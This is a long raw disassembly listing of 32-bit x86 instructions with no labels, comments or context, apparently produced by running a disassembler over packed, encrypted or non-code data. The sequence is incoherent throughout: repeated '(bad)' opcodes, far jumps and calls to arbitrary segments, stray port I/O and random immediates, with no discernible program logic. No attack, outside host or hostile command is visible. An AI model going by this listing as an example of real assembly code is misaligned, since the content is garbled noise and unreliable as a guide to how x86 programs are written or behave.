  41dad6:	call   0xbcd0:0x4ede9bd0
  41dadd:	pusha  
  41dade:	or     eax,esp
  41dae0:	retf   0xbb4
  41dae3:	(bad)  
  41dae4:	out    0x68,eax
  41dae6:	xchg   ebx,eax
  41dae7:	jl     0x41db2d
  41dae9:	fsubr  st(3),st
  41daeb:	xchg   DWORD PTR [ecx-0x16],edi
  41daee:	imul   edi,DWORD PTR [esi-0x43],0x4e9a9f12
  41daf5:	sub    al,0x42
  41daf7:	dec    edx
  41daf8:	retf   
  41daf9:	mov    esp,0xaf9ed3c9
  41dafe:	stos   DWORD PTR es:[edi],eax
  41daff:	push   ds
  41db00:	and    ecx,esp
  41db02:	or     eax,0xfb52cd16
  41db07:	(bad)
  41db0a:	mov    ds:0xe0c6ec24,al
  41db0f:	loopne 0x41db7a
  41db11:	gs adc eax,0x3ce48e8d
  41db17:	mov    ebp,0xdab7d51f
  41db1c:	cs dec eax
  41db1e:	popa   
  41db1f:	sub    BYTE PTR [esi+eax*4+0x711b2b81],bh
  41db26:	add    DWORD PTR [ebx+0x7ad68fa0],0xffffffdc
  41db2d:	sbb    DWORD PTR [ecx+0x6c],eax
  41db30:	mov    bl,0x7d
  41db32:	js     0x41dac4
  41db34:	jb     0x41db18
  41db36:	addr16 pop ds
  41db38:	das    
  41db39:	push   ds
  41db3a:	cli    
  41db3b:	and    BYTE PTR [ecx],bh
  41db3d:	pop    ecx
  41db3e:	mov    dh,0x33
  41db40:	adc    BYTE PTR [esp+ecx*4],cl
  41db43:	push   0xffffffec
  41db45:	sbb    ebx,DWORD PTR [edi+0x9]
  41db48:	push   edi
  41db49:	div    DWORD PTR [ecx+0x1b]
  41db4c:	(bad)  
  41db4d:	jl     0x41dbb0
  41db4f:	mov    eax,0xd6d5266b
  41db54:	fwait
  41db55:	xchg   DWORD PTR [edx],ebp
  41db57:	(bad)  
  41db58:	call   0xe397157a
  41db5d:	test   eax,0x178eeefe
  41db62:	retf   0xdacb
  41db65:	dec    ebp
  41db66:	pushf  
  41db67:	(bad)  
  41db68:	shr    BYTE PTR [edi-0x53e25aab],1
  41db6e:	test   edx,ecx
  41db70:	xchg   esp,ebp
  41db72:	or     ebx,DWORD PTR [ecx-0x61b2e90e]
  41db78:	cld    
  41db79:	lods   eax,DWORD PTR ds:[esi]
  41db7a:	in     eax,dx
  41db7b:	and    eax,0x7367541c
  41db80:	nop
  41db81:	ss dec eax
  41db83:	shl    BYTE PTR [edi],cl
  41db85:	in     al,dx
  41db86:	jmp    0x7348:0xbd0041ef
  41db8d:	fidivr WORD PTR [esi]
  41db8f:	(bad)  [ecx-0x74]
  41db92:	adc    eax,0xbfaec525
  41db97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db98:	dec    edx
  41db99:	cli    
  41db9a:	cmc    
  41db9b:	fucomi st,st(0)
  41db9d:	fs dec eax
  41db9f:	mov    ebp,0x84f0a013
  41dba4:	jbe    0x41dbfe
  41dba6:	mov    ds:0xb9c0d73,al
  41dbab:	loopne 0x41dbe6
  41dbad:	sub    eax,0x20844ac4
  41dbb2:	sar    DWORD PTR [ebx+0x69],0xec
  41dbb6:	cs loopne 0x41db40
  41dbb9:	outs   dx,BYTE PTR ds:[esi]
  41dbba:	push   0xa85bcf91
  41dbbf:	jmp    0x41dc1b
  41dbc1:	jae    0x41db6a
  41dbc3:	retf   0x13a1
  41dbc6:	sahf   
  41dbc7:	push   esi
  41dbc8:	mov    edi,0x91226086
  41dbcd:	xchg   ebp,eax
  41dbce:	cmc    
  41dbcf:	cmp    al,0x40
  41dbd1:	in     al,0x8a
  41dbd3:	xchg   edx,eax
  41dbd4:	jge    0x41dbf8
  41dbd6:	stos   BYTE PTR es:[edi],al
  41dbd7:	mov    eax,0x5802c0b3
  41dbdc:	sub    eax,0x5adbaece
  41dbe1:	mov    BYTE PTR [ecx+0x5ffcb900],bh
  41dbe7:	dec    edi
  41dbe8:	mov    ecx,0x1782b9ba
  41dbed:	xchg   ebx,eax
  41dbee:	mov    al,ds:0x16be4f1b
  41dbf3:	sub    al,0xc5
  41dbf5:	xchg   edx,eax
  41dbf6:	sbb    al,0xc3
  41dbf8:	scas   eax,DWORD PTR es:[edi]
  41dbf9:	enter  0x182,0x36
  41dbfd:	inc    edi
  41dbfe:	cmp    eax,0x37492e13
  41dc03:	(bad)  
  41dc04:	mov    edi,0x57df3df
  41dc09:	pop    eax
  41dc0a:	push   cs
  41dc0b:	shl    ebx,0x16
  41dc0e:	pop    eax
  41dc0f:	not    ecx
  41dc11:	mov    al,ds:0x73821d13
  41dc16:	gs pusha 
  41dc18:	sub    al,0x38
  41dc1a:	rcl    DWORD PTR [eax],cl
  41dc1c:	push   0xffffffd8
  41dc1e:	retf   0x4ee4
  41dc21:	mov    ebp,0x830ce30e
  41dc26:	jne    0x41dbb4
  41dc28:	xchg   edi,eax
  41dc29:	mov    eax,ds:0xcd24aace
  41dc2e:	hlt    
  41dc2f:	es por mm5,mm5
  41dc33:	sub    DWORD PTR [eax-0x348f5d72],esp
  41dc39:	sahf   
  41dc3a:	mov    ah,0x8b
  41dc3c:	sub    eax,0x5ef90655
  41dc41:	outs   dx,BYTE PTR ds:[esi]
  41dc42:	jnp    0x41dbd2
  41dc44:	pusha  
  41dc45:	mov    ds:0x5166a390,al
  41dc4a:	mov    WORD PTR [ecx+0x4f3320c0],?
  41dc50:	sbb    al,0xaa
  41dc52:	xchg   esp,eax
  41dc53:	push   ds
  41dc54:	and    al,0x4
  41dc56:	(bad)  
  41dc57:	rcr    DWORD PTR [edi+esi*2],1
  41dc5a:	dec    esi
  41dc5b:	mov    al,0x45
  41dc5d:	add    DWORD PTR [ecx+0x2],eax
  41dc60:	adc    BYTE PTR [eax+0x3e32e2bf],0xc6
  41dc67:	and    ecx,DWORD PTR [ebx]
  41dc69:	dec    eax
  41dc6a:	and    edx,DWORD PTR [eax+0x7d]
  41dc6d:	sub    BYTE PTR [edx],bl
  41dc6f:	popa   
  41dc70:	daa    
  41dc71:	add    bh,BYTE PTR [edx+0x2a3bd112]
  41dc77:	mov    ah,0x1a
  41dc79:	repz and ebx,DWORD PTR [ebp-0x32]
  41dc7d:	adc    eax,0x61c5c3c6
  41dc82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc84:	mov    esp,DWORD PTR [esi]
  41dc86:	dec    esi
  41dc87:	and    eax,0xe059c1b7
  41dc8c:	and    DWORD PTR [esp+eax*8-0x6c],edi
  41dc90:	aam    0x83
  41dc92:	jns    0x41dc90
  41dc94:	cli    
  41dc95:	sbb    BYTE PTR [edi],ch
  41dc97:	or     BYTE PTR [ebx+0x56],0x1
  41dc9b:	mov    eax,DWORD PTR [eax+0x348e41ba]
  41dca1:	xor    al,0x77
  41dca3:	imul   ebx,DWORD PTR [esi],0x22377dae
  41dca9:	stos   BYTE PTR es:[edi],al
  41dcaa:	mov    ebp,0xd54384ea
  41dcaf:	mov    ds,WORD PTR [edx+edi*1]
  41dcb2:	cmp    al,0xa6
  41dcb4:	dec    eax
  41dcb5:	pop    ss
  41dcb6:	mul    BYTE PTR [edi]
  41dcb8:	push   edi
  41dcb9:	test   BYTE PTR [eax+0x3b],0x15
  41dcbd:	dec    ebx
  41dcbe:	adc    edx,DWORD PTR [edi+0x4a]
  41dcc1:	ins    BYTE PTR es:[edi],dx
  41dcc2:	push   edi
  41dcc3:	mov    BYTE PTR [esi+0x4c69f5c3],dl
  41dcc9:	(bad)  
  41dccb:	mov    ecx,0x966860f
  41dcd0:	fild   DWORD PTR [edi-0x4ddecf69]
  41dcd6:	sbb    ecx,DWORD PTR [eax]
  41dcd8:	mov    esi,0x989ced48
  41dcdd:	jo     0x41dcef
  41dcdf:	out    0xc2,eax
  41dce1:	add    BYTE PTR [edi-0x6e],dl
  41dce4:	or     eax,edx
  41dce6:	retf   
  41dce7:	je     0x41dc71
  41dce9:	mov    ch,0x2d
  41dceb:	lods   eax,DWORD PTR ds:[esi]
  41dcec:	jmp    0x5260:0x7378f7b0
  41dcf3:	dec    esp
  41dcf4:	xchg   ebp,eax
  41dcf5:	(bad)  
  41dcf8:	stos   DWORD PTR es:[edi],eax
  41dcf9:	fwait
  41dcfa:	repz in al,dx
  41dcfc:	push   ss
  41dcfd:	mov    ds:0xdb4460a2,al
  41dd02:	jle    0x41dcb0
  41dd04:	dec    esp
  41dd05:	mov    ds:0x4e08d266,eax
  41dd0a:	sub    eax,DWORD PTR [edx+0x55ef67e3]
  41dd10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd11:	test   eax,0x6892ead2
  41dd16:	mov    al,0x7a
  41dd18:	mov    ecx,0xc571cc06
  41dd1d:	mov    esp,0xa9c5448d
  41dd22:	push   0xa855cec1
  41dd27:	and    al,0xf9
  41dd29:	add    eax,0x102d6365
  41dd2e:	leave  
  41dd2f:	out    dx,eax
  41dd30:	mov    bh,0x9d
  41dd32:	dec    ebp
  41dd33:	mov    WORD PTR [edx],ds
  41dd35:	das    
  41dd36:	rol    BYTE PTR fs:[edx],1
  41dd39:	shl    DWORD PTR [esi-0x37],cl
  41dd3c:	mov    ah,bh
  41dd3e:	pushf  
  41dd3f:	inc    edi
  41dd40:	popa   
  41dd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd42:	aam    0xca
  41dd44:	(bad)  
  41dd46:	inc    ebp
  41dd47:	jo     0x41dd4d
  41dd49:	inc    esi
  41dd4a:	enter  0x64f3,0x26
  41dd4e:	adc    esp,edx
  41dd50:	xchg   DWORD PTR [eax-0x104f82d8],edi
  41dd56:	inc    edx
  41dd57:	pop    esi
  41dd58:	and    DWORD PTR [ecx],0xffffff8d
  41dd5b:	ret    0xeaa3
  41dd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd5f:	xchg   edx,eax
  41dd60:	inc    DWORD PTR [ecx-0xd]
  41dd63:	mov    edx,0xa01aed2c
  41dd68:	mov    bh,ch
  41dd6a:	sub    edx,ecx
  41dd6c:	mov    ss,WORD PTR [edx+edi*1+0x3d]
  41dd70:	rcr    esp,0x1e
  41dd73:	or     eax,0xe05f1fc4
  41dd78:	or     DWORD PTR [edx+esi*2+0x30],ebx
  41dd7c:	jmp    0xf2f7:0x19be2666
  41dd83:	mov    edx,0xe73f584a
  41dd88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd89:	xchg   ebx,eax
  41dd8a:	xor    ah,dl
  41dd8c:	bound  ecx,QWORD PTR [edi]
  41dd8e:	or     BYTE PTR [ecx-0x71f7ddb3],0x0
  41dd95:	ds inc edx
  41dd97:	cmp    al,0xfb
  41dd99:	arpl   bp,bp
  41dd9b:	jle    0x41dd94
  41dd9d:	mov    WORD PTR [eax+eax*8-0x3c],fs
  41dda1:	push   eax
  41dda2:	push   edx
  41dda3:	dec    esp
  41dda4:	sbb    esi,DWORD PTR [esi+0x1e]
  41dda7:	popa   
  41dda8:	stos   DWORD PTR es:[edi],eax
  41dda9:	int3   
  41ddaa:	(bad)  [edx+0x4b]
  41ddad:	iret   
  41ddae:	das    
  41ddaf:	imul   ebx,DWORD PTR [ecx-0x47d619ed],0x88494c2f
  41ddb9:	xchg   edi,eax
  41ddba:	fisttp QWORD PTR [edi-0x5a]
  41ddbd:	xchg   DWORD PTR [ecx+0x325ea42f],eax
  41ddc3:	in     al,dx
  41ddc4:	mov    DWORD PTR [edx],ecx
  41ddc6:	ja     0x41ddb9
  41ddc8:	and    eax,0xf550f45f
  41ddcd:	aad    0x1a
  41ddcf:	enter  0x202f,0xba
  41ddd3:	sbb    DWORD PTR [eax+0x41],0xffffff95
  41ddd7:	and    al,0xb
  41ddd9:	or     DWORD PTR [esi],ebx
  41dddb:	adc    eax,0x4cd5201b
  41dde0:	push   edi
  41dde1:	mov    ch,0x2a
  41dde3:	xchg   ecx,eax
  41dde4:	fcomi  st,st(6)
  41dde6:	js     0x41dded
  41dde8:	pop    ebx
  41dde9:	dec    DWORD PTR [edi+0x3fa4a5fc]
  41ddef:	aaa    
  41ddf0:	loope  0x41dda9
  41ddf2:	or     BYTE PTR [edx+0x16],cl
  41ddf5:	add    ch,BYTE PTR [edx+ebp*2]
  41ddf8:	(bad)  [eax-0x71023ebd]
  41ddfe:	repz sahf 
  41de00:	in     eax,0xf4
  41de02:	ficom  WORD PTR [edx+ebp*2]
  41de05:	cmp    eax,0x1be9fd8c
  41de0a:	les    ecx,FWORD PTR [edi]
  41de0c:	push   ds
  41de0d:	adc    DWORD PTR ds:0x61a2d986,ebp
  41de13:	mov    esp,0xba0c6236
  41de18:	lahf   
  41de19:	mov    al,0xfc
  41de1b:	jmp    0x2d9be46a
  41de20:	aad    0xa4
  41de22:	pop    es
  41de23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de24:	cmc    
  41de25:	test   edi,0xc53d73cf
  41de2b:	loopne 0x41dddc
  41de2d:	or     eax,0x7fd45e00
  41de32:	mov    ecx,esi
  41de34:	iret   
  41de35:	pushf  
  41de36:	retf   0x53df
  41de39:	inc    edi
  41de3a:	dec    edx
  41de3b:	mov    eax,ds:0x7450bd50
  41de40:	inc    esp
  41de41:	xchg   edi,eax
  41de42:	test   DWORD PTR [edi],ecx
  41de44:	int3   
  41de45:	imul   edx,DWORD PTR ds:0xe592ce86,0xc15fea13
  41de4f:	mov    ecx,0xc1dc61dd
  41de54:	inc    eax
  41de55:	call   0x6477:0xfb22f645
  41de5c:	mov    ch,0x68
  41de5e:	pop    eax
  41de5f:	mov    ebx,0x4433ebbd
  41de64:	enter  0x3429,0x90
  41de68:	pop    ss
  41de69:	sbb    al,0x64
  41de6b:	mov    al,ds:0xbd18949f
  41de70:	jbe    0x41deac
  41de72:	inc    ecx
  41de73:	mov    eax,0xc98f7b45
  41de78:	cmp    bl,ah
  41de7a:	sbb    eax,0x9297c766
  41de7f:	mov    bl,0xbb
  41de81:	push   es
  41de82:	std    
  41de83:	in     eax,dx
  41de84:	ds aad 0xfb
  41de87:	sbb    al,0x1f
  41de89:	inc    edx
  41de8a:	or     al,0x3f
  41de8c:	imul   esp,DWORD PTR gs:[eax],0x75
  41de90:	les    esi,FWORD PTR [edi+0x6d]
  41de93:	popf   
  41de94:	stos   BYTE PTR es:[edi],al
  41de95:	push   ebp
  41de96:	jb     0x41de24
  41de98:	mov    ebp,0xa0f2719
  41de9d:	arpl   cx,cx
  41de9f:	inc    esi
  41dea0:	mov    edi,0x5e60777a
  41dea5:	test   BYTE PTR [esi],dl
  41dea7:	push   edx
  41dea8:	jo     0x41de35
  41deaa:	fld    DWORD PTR [ecx+0x59]
  41dead:	sti    
  41deae:	xchg   ebp,eax
  41deaf:	and    ebp,ecx
  41deb1:	test   eax,0x90680b0a
  41deb6:	pop    ebx
  41deb7:	adc    bh,BYTE PTR [ecx-0x76]
  41deba:	sbb    ah,BYTE PTR [ebx+0x4c]
  41debd:	aam    0x57
  41debf:	sub    al,BYTE PTR [ecx+0x65]
  41dec2:	in     eax,dx
  41dec3:	int    0xbb
  41dec5:	push   edx
  41dec6:	aaa    
  41dec7:	outs   dx,DWORD PTR ds:[esi]
  41dec8:	popa   
  41dec9:	je     0x41df39
  41decb:	or     BYTE PTR [esi],dh
  41decd:	rsm    
  41decf:	ds std 
  41ded1:	or     bl,BYTE PTR [ebx]
  41ded3:	call   0x162ff734
  41ded8:	pop    ds
  41ded9:	test   eax,0x42bdfc94
  41dede:	xor    eax,0x3998838c
  41dee3:	dec    ebx
  41dee4:	dec    ebp
  41dee5:	fld    DWORD PTR [ecx+edi*2]
  41dee8:	outs   dx,DWORD PTR ds:[esi]
  41dee9:	and    dh,BYTE PTR [esi-0x6f]
  41deec:	dec    edx
  41deed:	or     BYTE PTR [edx],cl
  41deef:	scas   al,BYTE PTR es:[edi]
  41def0:	mov    BYTE PTR [edx+0x2919f0c5],ah
  41def6:	inc    esi
  41def7:	xchg   ebp,eax
  41def8:	pop    edx
  41def9:	lahf   
  41defa:	cmp    DWORD PTR [ecx],ecx
  41defc:	xor    al,0x56
  41defe:	xchg   BYTE PTR [eax-0x73a4d437],al
  41df04:	cmp    DWORD PTR [eax-0xb9b28a4],ecx
  41df0a:	leave  
  41df0b:	mov    dh,0xd4
  41df0d:	out    0x80,al
  41df0f:	pop    ds
  41df10:	aam    0x9b
  41df12:	mov    bl,0x69
  41df14:	and    DWORD PTR [edi],ebx
  41df16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df17:	addr16 push cs
  41df19:	fdivr  QWORD PTR [edi-0x25e70079]
  41df1f:	out    dx,eax
  41df20:	push   esp
  41df21:	xchg   edx,eax
  41df22:	sbb    BYTE PTR [edi-0x70068040],dl
  41df28:	retf   0x4943
  41df2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df2c:	pop    edi
  41df2d:	add    al,BYTE PTR [esi]
  41df2f:	repz (bad) 
  41df31:	jecxz  0x41dfb2
  41df33:	(bad)  [ebp+0x730cc30]
  41df39:	push   ds
  41df3a:	adc    al,0x70
  41df3c:	jbe    0x41df32
  41df3e:	bound  edx,QWORD PTR [edx]
  41df40:	push   ebp
  41df41:	push   ecx
  41df42:	add    dl,BYTE PTR [ebx-0x160bc5ee]
  41df48:	ficom  WORD PTR [eax-0xf035d93]
  41df4e:	push   esp
  41df4f:	gs jmp 0xa06c7334
  41df55:	jmp    0x2f40043f
  41df5a:	sar    BYTE PTR [edi-0x7ecc6270],cl
  41df60:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df62:	jge    0x41dee9
  41df64:	std    
  41df65:	push   ss
  41df66:	rcl    BYTE PTR [esi+ebp*8+0xe886e74],0x8c
  41df6e:	(bad)  
  41df6f:	outs   dx,BYTE PTR ds:[esi]
  41df70:	jb     0x41df31
  41df72:	pusha  
  41df73:	inc    ecx
  41df74:	push   ss
  41df75:	mov    edx,esi
  41df77:	ret    
  41df78:	pop    ecx
  41df79:	loop   0x41df9d
  41df7b:	sbb    esp,DWORD PTR [esi-0x53]
  41df7e:	mov    esi,ds
  41df80:	in     al,0x29
  41df82:	sbb    al,0xdc
  41df84:	sti    
  41df85:	lds    ebx,FWORD PTR [ebp-0x495c1c68]
  41df8b:	or     bh,bh
  41df8d:	jbe    0x41df7d
  41df8f:	retf   
  41df90:	loop   0x41dfa5
  41df92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df93:	add    al,0xca
  41df95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df96:	jns    0x41df3a
  41df98:	sbb    al,0x11
  41df9a:	ficom  DWORD PTR [ecx+0x79]
  41df9d:	and    al,0x5
  41df9f:	push   cs
  41dfa0:	rcl    DWORD PTR [ebp+edx*1+0x53],1
  41dfa4:	xchg   ebx,eax
  41dfa5:	pop    edx
  41dfa6:	inc    esp
  41dfa7:	mov    esp,0x1b70d750
  41dfac:	push   esp
  41dfad:	dec    edx
  41dfae:	jbe    0x41e01e
  41dfb0:	cdq    
  41dfb1:	scas   al,BYTE PTR es:[edi]
  41dfb2:	push   esp
  41dfb3:	retf   0xbec8
  41dfb6:	lds    esp,FWORD PTR [ebx+0x41]
  41dfb9:	pushf  
  41dfba:	push   ebp
  41dfbb:	xor    DWORD PTR [esi-0xd],ecx
  41dfbe:	dec    BYTE PTR [edi-0x8]
  41dfc1:	adc    DWORD PTR [eax+0x6416c77],esi
  41dfc7:	jnp    0x41e019
  41dfc9:	cmc    
  41dfca:	imul   BYTE PTR [ebx+esi*4+0x5b]
  41dfce:	repnz fbstp TBYTE PTR cs:[ecx+eiz*8-0x67]
  41dfd4:	cmc    
  41dfd5:	ins    DWORD PTR es:[edi],dx
  41dfd6:	adc    eax,0xb083d941
  41dfdb:	sub    dl,al
  41dfdd:	inc    esp
  41dfde:	adc    al,0x72
  41dfe0:	and    eax,0xf776be35
  41dfe5:	into   
  41dfe6:	mov    eax,0x7a0ef7ab
  41dfeb:	loope  0x41dfd5
  41dfed:	push   edi
  41dfee:	sub    BYTE PTR [esi+ecx*1-0x1cde9dc0],0x38
  41dff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff7:	aaa    
  41dff8:	inc    ebp
  41dff9:	pusha  
  41dffa:	adc    BYTE PTR [edx-0x76847f0],dl
  41e000:	push   eax
  41e001:	jg     0x41e077
  41e003:	test   edi,ebp
  41e005:	mov    eax,ds:0x10b6f0b2
  41e00a:	and    ecx,edx
  41e00c:	movaps XMMWORD PTR [edi-0x551457de],xmm6
  41e013:	mov    edx,0xd000af9e
  41e018:	mov    bl,0x94
  41e01a:	and    edi,esi
  41e01c:	or     ch,BYTE PTR [edi-0x2e]
  41e01f:	fistp  WORD PTR [ecx]
  41e021:	or     DWORD PTR [esi+0x5],0xffffffd5
  41e025:	(bad)  
  41e026:	(bad)  
  41e027:	add    eax,0xbb126ee9
  41e02c:	pop    ecx
  41e02d:	mov    ch,cl
  41e02f:	outs   dx,BYTE PTR ds:[esi]
  41e030:	mov    eax,ds:0xbeedd043
  41e035:	(bad)  
  41e036:	xor    BYTE PTR [esi],0xaf
  41e039:	shr    BYTE PTR [eax],0x57
  41e03c:	jno    0x41e0b7
  41e03e:	sbb    DWORD PTR [esi],ebp
  41e040:	jno    0x41e053
  41e042:	clc    
  41e043:	(bad)
  41e046:	xor    ah,BYTE PTR [esi+0x53d7fc3f]
  41e04c:	push   es
  41e04d:	mov    edx,0x563c21cf
  41e052:	int    0x43
  41e054:	inc    ecx
  41e055:	jns    0x41e09b
  41e057:	mov    ds,WORD PTR [ecx-0x1b0b757]
  41e05d:	int    0x2f
  41e05f:	sub    BYTE PTR [esi],dl
  41e061:	xchg   ecx,eax
  41e062:	loopne 0x41dfef
  41e064:	mov    ah,0xfe
  41e066:	out    dx,al
  41e067:	pop    esp
  41e068:	adc    DWORD PTR [edx-0x39f063cd],edx
  41e06e:	xchg   edx,eax
  41e06f:	dec    esi
  41e070:	mov    DWORD PTR [eax],0x11aaec1
  41e076:	dec    esp
  41e077:	pop    es
  41e078:	in     al,0x4
  41e07a:	inc    esp
  41e07b:	mov    BYTE PTR [esi+0x28a158ea],cl
  41e081:	loope  0x41e049
  41e083:	lds    esp,FWORD PTR [ecx-0x1c]
  41e086:	loope  0x41e064
  41e088:	jg     0x41e080
  41e08a:	xor    DWORD PTR [ebx-0x5c8e821a],ebp
  41e090:	stos   DWORD PTR es:[edi],eax
  41e091:	aaa    
  41e092:	jnp    0x41e07f
  41e094:	xor    BYTE PTR [ebx+0x7c6287ad],0xf9
  41e09b:	inc    edi
  41e09c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e09d:	aad    0x26
  41e09f:	inc    edx
  41e0a0:	pop    edi
  41e0a1:	sbb    BYTE PTR [edx-0x34],ah
  41e0a4:	xor    al,BYTE PTR [edi-0x7f35f913]
  41e0aa:	ja     0x41e125
  41e0ac:	sbb    al,0x93
  41e0ae:	cmp    eax,0x1322e306
  41e0b3:	add    ecx,DWORD PTR [ebx]
  41e0b5:	pop    esi
  41e0b6:	push   eax
  41e0b7:	mov    eax,0x9ed3f29c
  41e0bc:	push   edi
  41e0bd:	and    ebp,DWORD PTR [eax-0x19]
  41e0c0:	fwait
  41e0c1:	jns    0x41e122
  41e0c3:	sti    
  41e0c4:	jmp    0x41e0da
  41e0c6:	push   ebx
  41e0c7:	inc    eax
  41e0c8:	jge    0x41e0ed
  41e0ca:	sbb    ebx,DWORD PTR [edi+0x7cc6a4ca]
  41e0d0:	jecxz  0x41e0ff
  41e0d2:	jns    0x41e060
  41e0d4:	push   cs
  41e0d5:	dec    ebx
  41e0d6:	aam    0x65
  41e0d8:	jnp    0x41e0a4
  41e0da:	jmp    0x41e147
  41e0dc:	scas   al,BYTE PTR es:[edi]
  41e0dd:	in     eax,0x94
  41e0df:	pop    ebx
  41e0e0:	das    
  41e0e1:	pop    ecx
  41e0e2:	lds    ebx,FWORD PTR [ecx]
  41e0e4:	(bad)  
  41e0e5:	es xchg ecx,eax
  41e0e7:	cmp    DWORD PTR [ecx-0x2b65479f],0xa28dfb52
  41e0f1:	jo     0x41e0d1
  41e0f3:	fisttp DWORD PTR [esi]
  41e0f5:	xor    al,0x8d
  41e0f7:	push   ebp
  41e0f8:	aad    0xae
  41e0fa:	out    dx,al
  41e0fb:	and    eax,0x8b116fc2
  41e100:	ja     0x41e136
  41e102:	retf   
  41e103:	mov    bl,0x2a
  41e105:	dec    edi
  41e106:	xor    bh,BYTE PTR [edx+ebp*4]
  41e109:	cwde   
  41e10a:	test   al,0xce
  41e10c:	sbb    ebp,DWORD PTR [eax-0x3c4d4cd2]
  41e112:	inc    ebp
  41e113:	push   0x55ae8332
  41e118:	push   eax
  41e119:	push   cs
  41e11a:	ja     0x41e188
  41e11c:	mov    gs,ecx
  41e11e:	in     al,dx
  41e11f:	lahf   
  41e120:	shl    DWORD PTR [eax],1
  41e122:	push   esi
  41e123:	mov    WORD PTR [ebx-0xf],?
  41e126:	and    dh,BYTE PTR [ecx+0x23]
  41e129:	mov    ds:0xf5afb78d,al
  41e12e:	inc    edi
  41e12f:	ret    
  41e130:	dec    esp
  41e131:	xchg   ebp,eax
  41e132:	int    0x37
  41e134:	fmul   DWORD PTR [edx-0x7e]
  41e137:	retf   0x6f04
  41e13a:	call   0x6190641a
  41e13f:	xchg   DWORD PTR [ecx-0x61],eax
  41e142:	jecxz  0x41e12d
  41e144:	xor    eax,0xca2f3ae4
  41e149:	retf   
  41e14a:	adc    BYTE PTR [edi],ah
  41e14c:	mov    eax,0xb1f76414
  41e151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e152:	je     0x41e116
  41e154:	xor    al,0xab
  41e156:	int3   
  41e157:	fdiv   DWORD PTR [ecx-0x24]
  41e15a:	dec    eax
  41e15b:	stc    
  41e15c:	data16 sahf 
  41e15e:	sub    edi,DWORD PTR [edx-0x2e06ea50]
  41e164:	xchg   edx,eax
  41e165:	(bad)  
  41e166:	(bad)  
  41e167:	int3   
  41e168:	shr    dh,1
  41e16a:	(bad)  
  41e16b:	cmp    al,BYTE PTR [eax+esi*1-0x3e8b3184]
  41e172:	mov    bh,0xbd
  41e174:	sbb    al,0xb1
  41e176:	cmc    
  41e177:	ja     0x41e1c0
  41e179:	xor    edi,DWORD PTR [esp+edi*1-0x26]
  41e17d:	cmc    
  41e17e:	ins    BYTE PTR es:[edi],dx
  41e17f:	xor    DWORD PTR [eax],esi
  41e181:	fucomip st,st(6)
  41e183:	mov    eax,ds:0xb2dcab5
  41e188:	cmp    eax,0x37cde025
  41e18d:	int3   
  41e18e:	in     eax,dx
  41e18f:	or     esi,eax
  41e191:	(bad)  
  41e192:	lods   al,BYTE PTR ds:[esi]
  41e193:	loop   0x41e1be
  41e195:	cmp    al,0x58
  41e197:	and    DWORD PTR [ebp+ecx*8+0x4c6b8e9b],ecx
  41e19e:	adc    BYTE PTR [ebx-0x265d7f3c],ch
  41e1a4:	mov    eax,0x8d38e73c
  41e1a9:	xor    DWORD PTR [edx+0x5],ebp
  41e1ac:	cmp    bh,al
  41e1ae:	inc    esi
  41e1af:	outs   dx,BYTE PTR ds:[esi]
  41e1b0:	mov    DWORD PTR [ecx+0x7f],ecx
  41e1b3:	hlt    
  41e1b4:	(bad)  
  41e1b5:	push   ds
  41e1b6:	fwait
  41e1b7:	pop    esp
  41e1b8:	sbb    bl,ch
  41e1ba:	xor    eax,0x1b737d9
  41e1bf:	ret    0x384c
  41e1c2:	add    BYTE PTR [ebx-0x29],dl
  41e1c5:	imul   esi,ebp,0x37
  41e1c8:	adc    ebx,DWORD PTR [edi]
  41e1ca:	pusha  
  41e1cb:	int3   
  41e1cc:	hlt    
  41e1cd:	dec    esi
  41e1ce:	or     DWORD PTR [ecx+0x1d6588d2],ecx
  41e1d4:	repz out 0xe4,eax
  41e1d7:	and    eax,0xfd091b89
  41e1dc:	fidivr WORD PTR [edx-0x7d1f7a45]
  41e1e2:	int3   
  41e1e3:	xchg   ecx,eax
  41e1e4:	jle    0x41e1ed
  41e1e6:	ret    0x8614
  41e1e9:	ret    0x1672
  41e1ec:	shr    DWORD PTR [edx+0x15],cl
  41e1ef:	mov    ch,0xcf
  41e1f1:	mov    eax,0x61953e86
  41e1f6:	pushf  
  41e1f7:	jp     0x41e257
  41e1f9:	xchg   ecx,eax
  41e1fa:	or     esp,edi
  41e1fc:	in     eax,0x35
  41e1fe:	lods   eax,DWORD PTR ds:[esi]
  41e1ff:	or     al,0x8d
  41e201:	push   es
  41e202:	push   es
  41e203:	(bad)  [edx+0x2974032d]
  41e209:	pusha  
  41e20a:	cmp    BYTE PTR [esi-0x26],0xe1
  41e20e:	dec    eax
  41e20f:	or     al,0x92
  41e211:	scas   al,BYTE PTR es:[edi]
  41e212:	retf   0xd355
  41e215:	fdivr  DWORD PTR [edi-0x1d]
  41e218:	jle    0x41e1f4
  41e21a:	push   es
  41e21b:	icebp  
  41e21c:	xchg   DWORD PTR [esi+0xfed948a],esi
  41e222:	xchg   ebp,eax
  41e223:	pushf  
  41e224:	pop    edi
  41e225:	pop    esp
  41e226:	outs   dx,DWORD PTR ds:[esi]
  41e227:	mov    ebp,edi
  41e229:	push   cs
  41e22a:	or     BYTE PTR [edi+0x35],dl
  41e22d:	pop    esp
  41e22e:	popa   
  41e22f:	sub    edx,esp
  41e231:	ret    
  41e232:	test   BYTE PTR [eax+0x6e],ah
  41e235:	sub    al,0x9d
  41e237:	sbb    edi,DWORD PTR ss:[esi+0x78]
  41e23b:	or     al,0xf0
  41e23d:	dec    ebp
  41e23e:	lds    eax,FWORD PTR [edi-0x24529d1d]
